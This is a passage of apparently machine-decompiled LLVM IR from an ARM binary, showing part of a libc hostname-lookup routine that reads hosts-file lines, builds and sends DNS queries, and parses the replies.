  store i8 0, i8* %v3_ce6c, align 1
  %v3_ce70 = call i32 @name_from_numeric(i32 %v4_ce60, i32 %v2_cefc, i32 %v0_ce68)
  %v2_ce74 = icmp eq i32 %v3_ce70, 0
  store i1 %v2_ce74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ce74, label %.preheader, label %bb261

bb261:                                            ; preds = %dec_label_pc_ce58
  %v1_ce78 = load i32, i32* @r7, align 4
  %v2_ce78 = add i32 %v1_ce78, 1
  store i32 %v2_ce78, i32* @r7, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb261, %dec_label_pc_ce58
  %v0_ce7c.pre = load i32, i32* @r4, align 4
  %v1_ce7c310 = add i32 %v0_ce7c.pre, 1
  store i32 %v1_ce7c310, i32* @r4, align 4
  %v1_ce80311 = inttoptr i32 %v1_ce7c310 to i8*
  %v2_ce80312 = load i8, i8* %v1_ce80311, align 1
  %v3_ce80313 = zext i8 %v2_ce80312 to i32
  store i32 %v3_ce80313, i32* %r3.global-to-local, align 4
  %v2_ce84314 = icmp eq i8 %v2_ce80312, 0
  store i1 %v2_ce84314, i1* %cpsr_z.global-to-local, align 1
  %v1_ce88315 = add nsw i32 %v3_ce80313, -9
  store i32 %v1_ce88315, i32* %r2.global-to-local, align 4
  br i1 %v2_ce84314, label %dec_label_pc_ce90, label %dec_label_pc_ce98

dec_label_pc_ce90:                                ; preds = %.thread127.backedge, %bb262, %.preheader
  %v1_ce7c.lcssa = phi i32 [ %v1_ce7c310, %.preheader ], [ %v1_ce7c316, %bb262 ], [ %v1_ce7c, %.thread127.backedge ]
  %v1_ce80.lcssa = phi i8* [ %v1_ce80311, %.preheader ], [ %v1_ce80317, %bb262 ], [ %v1_ce80, %.thread127.backedge ]
  store i32 %v1_ce7c.lcssa, i32* @r5, align 4
  %v2_ceac39 = load i8, i8* %v1_ce80.lcssa, align 1
  %v3_ceac40 = zext i8 %v2_ceac39 to i32
  store i32 %v3_ceac40, i32* %r3.global-to-local, align 4
  %v2_ceb041 = icmp eq i8 %v2_ceac39, 0
  store i1 %v2_ceb041, i1* %cpsr_z.global-to-local, align 1
  %v1_ceb442 = add nsw i32 %v3_ceac40, -9
  store i32 %v1_ceb442, i32* %r2.global-to-local, align 4
  br i1 %v2_ceb041, label %dec_label_pc_cec8, label %dec_label_pc_cebc

dec_label_pc_ce98:                                ; preds = %.preheader, %.thread127.backedge
  %v1_ce88320 = phi i32 [ %v1_ce88, %.thread127.backedge ], [ %v1_ce88315, %.preheader ]
  %v2_ce80318 = phi i8 [ %v2_ce80, %.thread127.backedge ], [ %v2_ce80312, %.preheader ]
  %v1_ce80317 = phi i8* [ %v1_ce80, %.thread127.backedge ], [ %v1_ce80311, %.preheader ]
  %v1_ce7c316 = phi i32 [ %v1_ce7c, %.thread127.backedge ], [ %v1_ce7c310, %.preheader ]
  %v7_ce98 = icmp eq i8 %v2_ce80318, 32
  store i1 %v7_ce98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ce98, label %.thread127.backedge, label %bb262

bb262:                                            ; preds = %dec_label_pc_ce98
  %v8_ce9c = icmp eq i32 %v1_ce88320, 4
  store i1 %v8_ce9c, i1* %cpsr_z.global-to-local, align 1
  %tmp339 = icmp ult i32 %v1_ce88320, 5
  br i1 %tmp339, label %.thread127.backedge, label %dec_label_pc_ce90

.thread127.backedge:                              ; preds = %bb262, %dec_label_pc_ce98
  %v1_ce7c = add i32 %v1_ce7c316, 1
  store i32 %v1_ce7c, i32* @r4, align 4
  %v1_ce80 = inttoptr i32 %v1_ce7c to i8*
  %v2_ce80 = load i8, i8* %v1_ce80, align 1
  %v3_ce80 = zext i8 %v2_ce80 to i32
  store i32 %v3_ce80, i32* %r3.global-to-local, align 4
  %v2_ce84 = icmp eq i8 %v2_ce80, 0
  store i1 %v2_ce84, i1* %cpsr_z.global-to-local, align 1
  %v1_ce88 = add nsw i32 %v3_ce80, -9
  store i32 %v1_ce88, i32* %r2.global-to-local, align 4
  br i1 %v2_ce84, label %dec_label_pc_ce90, label %dec_label_pc_ce98

dec_label_pc_cea8:                                ; preds = %bb263
  %v1_cea8 = add i32 %v0_cea8, 1
  store i32 %v1_cea8, i32* @r4, align 4
  %v1_ceac = inttoptr i32 %v1_cea8 to i8*
  %v2_ceac = load i8, i8* %v1_ceac, align 1
  %v3_ceac = zext i8 %v2_ceac to i32
  store i32 %v3_ceac, i32* %r3.global-to-local, align 4
  %v2_ceb0 = icmp eq i8 %v2_ceac, 0
  store i1 %v2_ceb0, i1* %cpsr_z.global-to-local, align 1
  %v1_ceb4 = add nsw i32 %v3_ceac, -9
  store i32 %v1_ceb4, i32* %r2.global-to-local, align 4
  br i1 %v2_ceb0, label %dec_label_pc_cec8, label %dec_label_pc_cebc

dec_label_pc_cebc:                                ; preds = %dec_label_pc_ce90, %dec_label_pc_cea8
  %v0_cea8 = phi i32 [ %v1_cea8, %dec_label_pc_cea8 ], [ %v1_ce7c.lcssa, %dec_label_pc_ce90 ]
  %v1_cec0 = phi i32 [ %v1_ceb4, %dec_label_pc_cea8 ], [ %v1_ceb442, %dec_label_pc_ce90 ]
  %v0_cebc = phi i32 [ %v3_ceac, %dec_label_pc_cea8 ], [ %v3_ceac40, %dec_label_pc_ce90 ]
  %v7_cebc = icmp eq i32 %v0_cebc, 32
  store i1 %v7_cebc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_cebc, label %dec_label_pc_cec8, label %bb263

bb263:                                            ; preds = %dec_label_pc_cebc
  %v3_cec0 = icmp ugt i32 %v1_cec0, 3
  %v8_cec0 = icmp eq i32 %v1_cec0, 4
  store i1 %v8_cec0, i1* %cpsr_z.global-to-local, align 1
  %v2_cec4 = xor i1 %v8_cec0, true
  %v3_cec4 = and i1 %v3_cec0, %v2_cec4
  br i1 %v3_cec4, label %dec_label_pc_cea8, label %dec_label_pc_cec8

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cea8, %bb263, %dec_label_pc_ce90
  %v2_ced0 = phi i32 [ %v1_ce7c.lcssa, %dec_label_pc_ce90 ], [ %v0_cea8, %dec_label_pc_cebc ], [ %v1_cea8, %dec_label_pc_cea8 ], [ %v0_cea8, %bb263 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ced0 = inttoptr i32 %v2_ced0 to i8*
  store i8 0, i8* %v3_ced0, align 1
  %v2_ced4 = call i32 @is_valid_hostname(i8* %v1_ce80.lcssa)
  %v2_ced8 = icmp eq i32 %v2_ced4, 0
  store i1 %v2_ced8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ced8, label %dec_label_pc_cf08.backedge, label %dec_label_pc_cee0

dec_label_pc_cee0:                                ; preds = %dec_label_pc_cec8
  %v0_cee0 = load i32, i32* @r5, align 4
  %v1_cee0 = sub i32 1, %v0_cee0
  %v1_cee4 = load i32, i32* @r4, align 4
  %v2_cee4 = add i32 %v1_cee4, %v1_cee0
  store i32 %v2_cee4, i32* %r2.global-to-local, align 4
  store i32 %v0_cee0, i32* %r1.global-to-local, align 4
  %v5_cef0 = call i32 @memcpy(i16* %tmp264, i32 %v0_cee0, i32 %v2_cee4)
  br label %dec_label_pc_cf08.backedge

dec_label_pc_cf08.backedge:                       ; preds = %dec_label_pc_cdec, %dec_label_pc_cee0, %dec_label_pc_cec8
  store i32 512, i32* %r1.global-to-local, align 4
  store i32 %v7_cdb4, i32* %r2.global-to-local, align 4
  %v4_cf14 = call i32 @fgets(i8* %v3_cf14, i32 512, i32 %v7_cdb4)
  %v2_cf18 = icmp eq i32 %v4_cf14, 0
  store i1 %v2_cf18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cf18, label %dec_label_pc_cf28, label %dec_label_pc_cf20

dec_label_pc_cef8:                                ; preds = %dec_label_pc_cd90
  %v2_cefc = ptrtoint i32* %stack_var_-920 to i32
  store i32 %v2_cefc, i32* @r6, align 4
  %v2_cf00 = ptrtoint i32* %stack_var_-919 to i32
  store i32 512, i32* %r1.global-to-local, align 4
  store i32 %v7_cdb4, i32* %r2.global-to-local, align 4
  %v3_cf14 = bitcast i32* %stack_var_-920 to i8*
  %v4_cf1443 = call i32 @fgets(i8* %v3_cf14, i32 512, i32 %v7_cdb4)
  %v2_cf1845 = icmp eq i32 %v4_cf1443, 0
  store i1 %v2_cf1845, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cf1845, label %dec_label_pc_cf28, label %dec_label_pc_cf20.lr.ph

dec_label_pc_cf20.lr.ph:                          ; preds = %dec_label_pc_cef8
  %tmp264 = inttoptr i32 %arg2 to i16*
  br label %dec_label_pc_cf20

dec_label_pc_cf20:                                ; preds = %dec_label_pc_cf20.lr.ph, %dec_label_pc_cf08.backedge
  %v0_cf20 = load i32, i32* @r7, align 4
  %v7_cf20 = icmp eq i32 %v0_cf20, 47
  store i1 %v7_cf20, i1* %cpsr_z.global-to-local, align 1
  %v7_cf24 = icmp slt i32 %v0_cf20, 48
  br i1 %v7_cf24, label %dec_label_pc_cdc8, label %dec_label_pc_cf28

dec_label_pc_cf28:                                ; preds = %dec_label_pc_cf08.backedge, %dec_label_pc_cf20, %dec_label_pc_cef8
  %v1_cf2c = call i32 @__fclose_ca(i32 %v7_cdb4)
  %v0_cf30 = load i32, i32* @r7, align 4
  %v2_cf30 = icmp eq i32 %v0_cf30, 0
  store i1 %v2_cf30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cf30, label %dec_label_pc_cf38, label %dec_label_pc_d0dc

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cd90, %dec_label_pc_cf28
  %v2_cf3c = ptrtoint i32* %stack_var_-1480 to i32
  store i32 %v2_cf3c, i32* @r4, align 4
  %v2_cf4c = ptrtoint i32* %stack_var_-2504 to i32
  store i32 %v2_cf4c, i32* %stack_var_-64, align 4
  %v2_cf5c = ptrtoint i32* %stack_var_-1992 to i32
  store i32 %v2_cf5c, i32* %r3.global-to-local, align 4
  %v2_cf60 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_cf60, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  store i32 %v2_cf3c, i32* %stack_var_-56, align 4
  %v0_cf74 = call i32 @memset()
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v0_cf7c = load i32, i32* @sb, align 4
  %v7_cf7c = icmp eq i32 %v0_cf7c, 10
  store i1 %v7_cf7c, i1* %cpsr_z.global-to-local, align 1
  %v0_cf84 = load i32, i32* @r8, align 4
  store i32 %v0_cf84, i32* %stack_var_-92, align 4
  br i1 %v7_cf7c, label %dec_label_pc_cfd4, label %dec_label_pc_cf90

dec_label_pc_cf90:                                ; preds = %dec_label_pc_cf38
  store i32 0, i32* @lr, align 4
  store i32 1, i32* @r2, align 4
  %v0_cfa0 = load i32, i32* @sl, align 4
  %v1_cfa0 = inttoptr i32 %v0_cfa0 to i8*
  store i32 %v0_cfa0, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_cfbc = call i32 @__res_mkquery(i32 0, i8* %v1_cfa0)
  %v0_cfc0 = load i32, i32* @sb, align 4
  %v7_cfc0 = icmp eq i32 %v0_cfc0, 2
  store i1 %v7_cfc0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_cfbc, i32* %stack_var_-72, align 4
  br i1 %v7_cfc0, label %dec_label_pc_d024, label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cf38
  %storemerge159 = phi i32 [ 0, %dec_label_pc_cf38 ], [ 1, %dec_label_pc_cf90 ]
  %v0_cfe0 = phi i32 [ 0, %dec_label_pc_cf38 ], [ 280, %dec_label_pc_cf90 ]
  store i32 %storemerge159, i32* @r5, align 4
  store i32 280, i32* @lr, align 4
  %v4_cfe0 = add i32 %v0_cfe0, %v2_cf3c
  store i32 %v4_cfe0, i32* @r4, align 4
  store i32 28, i32* @r3, align 4
  %v0_cff0 = load i32, i32* @sl, align 4
  %v1_cff0 = inttoptr i32 %v0_cff0 to i8*
  store i32 %v0_cff0, i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v11_d00c = call i32 @__res_mkquery(i32 0, i8* %v1_cff0)
  %v2_d014 = ptrtoint i32* %stack_var_-40 to i32
  %v1_d018 = load i32, i32* @r5, align 4
  %v4_d018 = mul i32 %v1_d018, 4
  %v5_d018 = add i32 %v4_d018, %v2_d014
  store i32 %v5_d018, i32* %r3.global-to-local, align 4
  %v2_d01c = add i32 %v5_d018, -32
  %v3_d01c = inttoptr i32 %v2_d01c to i32*
  store i32 %v11_d00c, i32* %v3_d01c, align 4
  %v0_d020 = load i32, i32* @r5, align 4
  %v1_d020 = add i32 %v0_d020, 1
  br label %dec_label_pc_d024

dec_label_pc_d024:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd4
  %storemerge160 = phi i32 [ %v1_d020, %dec_label_pc_cfd4 ], [ 1, %dec_label_pc_cf90 ]
  store i32 %storemerge160, i32* @r6, align 4
  %v2_d024 = ptrtoint i32* %stack_var_-64 to i32
  %v2_d028 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d028, i32* @r4, align 4
  %v2_d038 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_d038, i32* %r1.global-to-local, align 4
  %v2_d03c = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_d03c, i32* %r2.global-to-local, align 4
  store i32 %v2_d024, i32* %r3.global-to-local, align 4
  %v7_d048 = call i32 @__res_msend(i32 %storemerge160, i32 %v2_d038, i32 %v2_d03c, i32 %v2_d024, i32 %v2_d028, i32 512)
  %v1_d04c = icmp slt i32 %v7_d048, 0
  %v2_d04c = icmp eq i32 %v7_d048, 0
  store i1 %v2_d04c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d04c, label %bb268, label %dec_label_pc_d058

dec_label_pc_d058:                                ; preds = %dec_label_pc_d024
  store i32 %v2_d028, i32* @sl, align 4
  store i32 %v2_cf4c, i32* %r5.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d080

dec_label_pc_d074:                                ; preds = %dec_label_pc_d080
  %v0_d074 = load i32, i32* @sl, align 4
  %v4_d074 = mul i32 %v1_d074, 4
  %v5_d074 = add i32 %v0_d074, %v4_d074
  %v6_d074 = inttoptr i32 %v5_d074 to i32*
  %v7_d074 = load i32, i32* %v6_d074, align 4
  store i32 %v7_d074, i32* %r1.global-to-local, align 4
  %v4_d078 = call i32 @__dns_parse(i32 %v0_d084, i32 %v7_d074, i32 51740, i32 %v2_cf60)
  %v0_d07c = load i32, i32* @r4, align 4
  %v1_d07c = add i32 %v0_d07c, 1
  store i32 %v1_d07c, i32* @r4, align 4
  %v0_d084.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d058, %dec_label_pc_d074
  %v0_d084 = phi i32 [ %v2_cf4c, %dec_label_pc_d058 ], [ %v0_d084.pre, %dec_label_pc_d074 ]
  %v1_d074 = phi i32 [ 0, %dec_label_pc_d058 ], [ %v1_d07c, %dec_label_pc_d074 ]
  %v1_d080 = load i32, i32* @r6, align 4
  %v2_d080 = inttoptr i32 %v1_d074 to i8*
  %v3_d080 = inttoptr i32 %v1_d080 to i8*
  %v11_d080 = icmp eq i32 %v1_d074, %v1_d080
  store i1 %v11_d080, i1* %cpsr_z.global-to-local, align 1
  store i32 51740, i32* @r2, align 4
  store i32 %v2_cf60, i32* %r3.global-to-local, align 4
  %v1_d090 = add i32 %v0_d084, 512
  store i32 %v1_d090, i32* @r5, align 4
  %v7_d094 = icmp slt i8* %v2_d080, %v3_d080
  br i1 %v7_d094, label %dec_label_pc_d074, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d080
  store i32 %tmp172, i32* @r7, align 4
  %v2_d09c = icmp eq i32 %tmp172, 0
  store i1 %v2_d09c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d09c, label %dec_label_pc_d0a4, label %dec_label_pc_d0dc

dec_label_pc_d0a4:                                ; preds = %dec_label_pc_d098
  %v3_d0a4 = load i32, i32* %stack_var_-80, align 4
  store i32 %v3_d0a4, i32* %r3.global-to-local, align 4
  %v7_d0a8 = icmp eq i32 %v3_d0a4, 3
  store i1 %v7_d0a8, i1* %cpsr_z.global-to-local, align 1
  %v7_d0ac = icmp slt i32 %v3_d0a4, 4
  br i1 %v7_d0ac, label %dec_label_pc_d0d4, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d0a4
  %tmp340 = urem i8 %tmp171, 16
  %v1_d0b4 = zext i8 %tmp340 to i32
  store i32 %v1_d0b4, i32* %r3.global-to-local, align 4
  %v7_d0b8 = icmp eq i8 %tmp340, 2
  store i1 %v7_d0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d0b8, label %dec_label_pc_d0d4, label %dec_label_pc_d0c0

dec_label_pc_d0c0:                                ; preds = %dec_label_pc_d0b0
  %v7_d0c0 = icmp eq i8 %tmp340, 3
  store i1 %v7_d0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d0c0, label %bb267, label %.thread8

bb267:                                            ; preds = %dec_label_pc_d0c0
  br label %.thread18

.thread8:                                         ; preds = %dec_label_pc_d0c0
  br label %.thread18

.thread18:                                        ; preds = %bb267, %dec_label_pc_d0d4, %.thread8
  %v0_d42c114 = phi i32 [ -3, %dec_label_pc_d0d4 ], [ -2, %bb267 ], [ -4, %.thread8 ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d42c

bb268:                                            ; preds = %dec_label_pc_d024
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d42c

dec_label_pc_d0d4:                                ; preds = %dec_label_pc_d0b0, %dec_label_pc_d0a4
  br label %.thread18

dec_label_pc_d0dc:                                ; preds = %dec_label_pc_cf28, %dec_label_pc_d098, %dec_label_pc_cd70, %dec_label_pc_cd68
  %v0_d0dc = phi i32 [ %v0_cf30, %dec_label_pc_cf28 ], [ %tmp172, %dec_label_pc_d098 ], [ %v3_cd7c, %dec_label_pc_cd70 ], [ %v0_cd68, %dec_label_pc_cd68 ]
  %v2_d0dc = icmp eq i32 %v0_d0dc, 0
  store i1 %v2_d0dc, i1* %cpsr_z.global-to-local, align 1
  %v5_d0e0 = icmp sgt i32 %v0_d0dc, 0
  br i1 %v5_d0e0, label %dec_label_pc_d0f0, label %dec_label_pc_d42c

dec_label_pc_d0e8:                                ; preds = %dec_label_pc_cd88, %dec_label_pc_cbe0
  br label %dec_label_pc_d42c

dec_label_pc_d0f0:                                ; preds = %dec_label_pc_d0dc, %dec_label_pc_d424
  %v1_d11082 = phi i32 [ %v0_d0dc, %dec_label_pc_d0dc ], [ 1, %dec_label_pc_d424 ]
  %v0_d0f0 = load i32, i32* @fp, align 4
  %v1_d0f0 = and i32 %v0_d0f0, 8
  %v2_d0f0 = icmp eq i32 %v1_d0f0, 0
  store i1 %v2_d0f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d0f0, label %dec_label_pc_d1cc, label %dec_label_pc_d0f8

dec_label_pc_d0f8:                                ; preds = %dec_label_pc_d0f0
  %v1_d0f8 = and i32 %v0_d0f0, 16
  store i32 %v1_d0f8, i32* %r3.global-to-local, align 4
  %v2_d0f8 = icmp eq i32 %v1_d0f8, 0
  store i1 %v2_d0f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d0f8, label %dec_label_pc_d118.preheader, label %dec_label_pc_d178

dec_label_pc_d118.preheader:                      ; preds = %dec_label_pc_d0f8
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_d118.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d118

dec_label_pc_d10c:                                ; preds = %dec_label_pc_d118
  %v1_d10c = add i32 %v0_d12c, 1
  store i32 %v1_d10c, i32* %r5.global-to-local, align 4
  %v9_d110 = icmp eq i32 %v1_d10c, %v1_d11082
  br i1 %v9_d110, label %dec_label_pc_d178.loopexit, label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d118.preheader, %dec_label_pc_d10c
  %v0_d12c = phi i32 [ 0, %dec_label_pc_d118.preheader ], [ %v1_d10c, %dec_label_pc_d10c ]
  %v0_d120 = phi i32 [ 0, %dec_label_pc_d118.preheader ], [ %v1_d120, %dec_label_pc_d10c ]
  %v2_d118 = add i32 %v0_d120, %v1_d118.pre
  %v3_d118 = inttoptr i32 %v2_d118 to i32*
  %v4_d118 = load i32, i32* %v3_d118, align 4
  store i32 %v4_d118, i32* %r3.global-to-local, align 4
  %v7_d11c = icmp eq i32 %v4_d118, 10
  %v1_d120 = add i32 %v0_d120, 28
  store i32 %v1_d120, i32* @r2, align 4
  br i1 %v7_d11c, label %dec_label_pc_d128, label %dec_label_pc_d10c

dec_label_pc_d128:                                ; preds = %dec_label_pc_d118
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 28, i32* %r3.global-to-local, align 4
  %v3_d12c = mul i32 %v0_d12c, 28
  %v4_d12c = add i32 %v3_d12c, %v1_d118.pre
  store i32 %v4_d12c, i32* @r4, align 4
  store i32 28, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_d168293 = sub i32 %v0_d12c, %v1_d11082
  %v4_d168294 = xor i32 %v0_d12c, %v1_d11082
  %v5_d168295 = xor i32 %v2_d168293, %v0_d12c
  %v6_d168296 = and i32 %v5_d168295, %v4_d168294
  %v7_d168297 = icmp slt i32 %v6_d168296, 0
  %v8_d168298 = icmp slt i32 %v2_d168293, 0
  %v1_d16c299 = add i32 %v0_d12c, 1
  store i32 %v1_d16c299, i32* %r5.global-to-local, align 4
  %v2_d170300 = xor i1 %v8_d168298, %v7_d168297
  br i1 %v2_d170300, label %dec_label_pc_d13c, label %dec_label_pc_d174

dec_label_pc_d13c:                                ; preds = %dec_label_pc_d128, %dec_label_pc_d164
  %v1_d16c304 = phi i32 [ %v1_d16c, %dec_label_pc_d164 ], [ %v1_d16c299, %dec_label_pc_d128 ]
  %v1_d168303 = phi i32 [ %v1_d168.pre, %dec_label_pc_d164 ], [ %v1_d11082, %dec_label_pc_d128 ]
  %v0_d148302 = phi i32 [ %v0_d17485, %dec_label_pc_d164 ], [ 0, %dec_label_pc_d128 ]
  %v0_d14c301 = phi i32 [ %v1_d164, %dec_label_pc_d164 ], [ %v4_d12c, %dec_label_pc_d128 ]
  %v1_d13c = inttoptr i32 %v0_d14c301 to i32*
  %v2_d13c = load i32, i32* %v1_d13c, align 4
  store i32 %v2_d13c, i32* %r3.global-to-local, align 4
  %v7_d140 = icmp eq i32 %v2_d13c, 10
  br i1 %v7_d140, label %dec_label_pc_d148, label %dec_label_pc_d164

dec_label_pc_d148:                                ; preds = %dec_label_pc_d13c
  %v1_d148 = load i32, i32* %sl.global-to-local, align 4
  %v2_d148 = load i32, i32* @r8, align 4
  %v3_d148 = mul i32 %v1_d148, %v0_d148302
  %v4_d148 = add i32 %v2_d148, %v3_d148
  %v2_d150 = load i32, i32* %v1_d13c, align 4
  %v3_d150 = add i32 %v0_d14c301, 4
  %v4_d150 = inttoptr i32 %v3_d150 to i32*
  %v5_d150 = load i32, i32* %v4_d150, align 4
  store i32 %v5_d150, i32* %r1.global-to-local, align 4
  %v6_d150 = add i32 %v0_d14c301, 8
  %v7_d150 = inttoptr i32 %v6_d150 to i32*
  %v8_d150 = load i32, i32* %v7_d150, align 4
  store i32 %v8_d150, i32* %r2.global-to-local, align 4
  %v9_d150 = add i32 %v0_d14c301, 12
  %v10_d150 = inttoptr i32 %v9_d150 to i32*
  %v11_d150 = load i32, i32* %v10_d150, align 4
  store i32 %v11_d150, i32* %r3.global-to-local, align 4
  %v12_d150 = add i32 %v0_d14c301, 16
  store i32 %v12_d150, i32* @lr, align 4
  %v1_d154 = inttoptr i32 %v4_d148 to i32*
  store i32 %v2_d150, i32* %v1_d154, align 4
  %v3_d154 = add i32 %v4_d148, 4
  %v4_d154 = inttoptr i32 %v3_d154 to i32*
  %v5_d154 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_d154, i32* %v4_d154, align 4
  %v6_d154 = add i32 %v4_d148, 8
  %v7_d154 = inttoptr i32 %v6_d154 to i32*
  %v8_d154 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_d154, i32* %v7_d154, align 4
  %v9_d154 = add i32 %v4_d148, 12
  %v10_d154 = inttoptr i32 %v9_d154 to i32*
  %v11_d154 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_d154, i32* %v10_d154, align 4
  %v12_d154 = add i32 %v4_d148, 16
  store i32 %v12_d154, i32* @ip, align 4
  %v0_d158 = load i32, i32* @lr, align 4
  %v1_d158 = inttoptr i32 %v0_d158 to i32*
  %v2_d158 = load i32, i32* %v1_d158, align 4
  %v3_d158 = add i32 %v0_d158, 4
  %v4_d158 = inttoptr i32 %v3_d158 to i32*
  %v5_d158 = load i32, i32* %v4_d158, align 4
  store i32 %v5_d158, i32* %r1.global-to-local, align 4
  %v6_d158 = add i32 %v0_d158, 8
  %v7_d158 = inttoptr i32 %v6_d158 to i32*
  %v8_d158 = load i32, i32* %v7_d158, align 4
  store i32 %v8_d158, i32* @r2, align 4
  %v1_d15c = inttoptr i32 %v12_d154 to i32*
  store i32 %v2_d158, i32* %v1_d15c, align 4
  %v3_d15c = add i32 %v4_d148, 20
  %v4_d15c = inttoptr i32 %v3_d15c to i32*
  %v5_d15c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_d15c, i32* %v4_d15c, align 4
  %v6_d15c = add i32 %v4_d148, 24
  %v7_d15c = inttoptr i32 %v6_d15c to i32*
  %v8_d15c = load i32, i32* @r2, align 4
  store i32 %v8_d15c, i32* %v7_d15c, align 4
  %v0_d160 = load i32, i32* %r6.global-to-local, align 4
  %v1_d160 = add i32 %v0_d160, 1
  store i32 %v1_d160, i32* %r6.global-to-local, align 4
  %v0_d164.pre = load i32, i32* @r4, align 4
  %v0_d168.pre.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_d168.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d164

dec_label_pc_d164:                                ; preds = %dec_label_pc_d13c, %dec_label_pc_d148
  %v1_d168.pre = phi i32 [ %v1_d168303, %dec_label_pc_d13c ], [ %v1_d168.pre.pre, %dec_label_pc_d148 ]
  %v0_d168.pre = phi i32 [ %v1_d16c304, %dec_label_pc_d13c ], [ %v0_d168.pre.pre, %dec_label_pc_d148 ]
  %v0_d164 = phi i32 [ %v0_d14c301, %dec_label_pc_d13c ], [ %v0_d164.pre, %dec_label_pc_d148 ]
  %v0_d17485 = phi i32 [ %v0_d148302, %dec_label_pc_d13c ], [ %v1_d160, %dec_label_pc_d148 ]
  %v1_d164 = add i32 %v0_d164, 28
  store i32 %v1_d164, i32* @r4, align 4
  %v2_d168 = sub i32 %v0_d168.pre, %v1_d168.pre
  %v4_d168 = xor i32 %v0_d168.pre, %v1_d168.pre
  %v5_d168 = xor i32 %v2_d168, %v0_d168.pre
  %v6_d168 = and i32 %v5_d168, %v4_d168
  %v7_d168 = icmp slt i32 %v6_d168, 0
  %v8_d168 = icmp slt i32 %v2_d168, 0
  %v1_d16c = add i32 %v0_d168.pre, 1
  store i32 %v1_d16c, i32* %r5.global-to-local, align 4
  %v2_d170 = xor i1 %v8_d168, %v7_d168
  br i1 %v2_d170, label %dec_label_pc_d13c, label %dec_label_pc_d174

dec_label_pc_d174:                                ; preds = %dec_label_pc_d164, %dec_label_pc_d128
  %v0_d148.lcssa = phi i32 [ 0, %dec_label_pc_d128 ], [ %v0_d17485, %dec_label_pc_d164 ]
  %v1_d168.lcssa = phi i32 [ %v1_d11082, %dec_label_pc_d128 ], [ %v1_d168.pre, %dec_label_pc_d164 ]
  %v0_d16c.lcssa = phi i32 [ %v0_d12c, %dec_label_pc_d128 ], [ %v0_d168.pre, %dec_label_pc_d164 ]
  %v9_d168 = icmp eq i32 %v0_d16c.lcssa, %v1_d168.lcssa
  store i1 %v9_d168, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_d148.lcssa, i32* @r7, align 4
  br label %dec_label_pc_d178

dec_label_pc_d178.loopexit:                       ; preds = %dec_label_pc_d10c
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d178

dec_label_pc_d178:                                ; preds = %dec_label_pc_d178.loopexit, %dec_label_pc_d0f8, %dec_label_pc_d174
  %v1_d1c088 = phi i32 [ %v1_d11082, %dec_label_pc_d178.loopexit ], [ %v1_d11082, %dec_label_pc_d0f8 ], [ %v0_d148.lcssa, %dec_label_pc_d174 ]
  %v0_d178 = load i32, i32* @r8, align 4
  store i32 %v0_d178, i32* @r5, align 4
  store i32 10, i32* @sl, align 4
  %v3_d1c0283 = icmp eq i32 %v1_d1c088, 0
  store i1 %v3_d1c0283, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* @r6, align 4
  %v5_d1c8288 = icmp sgt i32 %v1_d1c088, 0
  br i1 %v5_d1c8288, label %dec_label_pc_d188, label %dec_label_pc_d1cc

dec_label_pc_d188:                                ; preds = %dec_label_pc_d178, %dec_label_pc_d1bc
  %v1_d1c4291 = phi i32 [ %v1_d1c4, %dec_label_pc_d1bc ], [ 1, %dec_label_pc_d178 ]
  %v1_d1c0290 = phi i32 [ %v1_d1c0.pre, %dec_label_pc_d1bc ], [ %v1_d1c088, %dec_label_pc_d178 ]
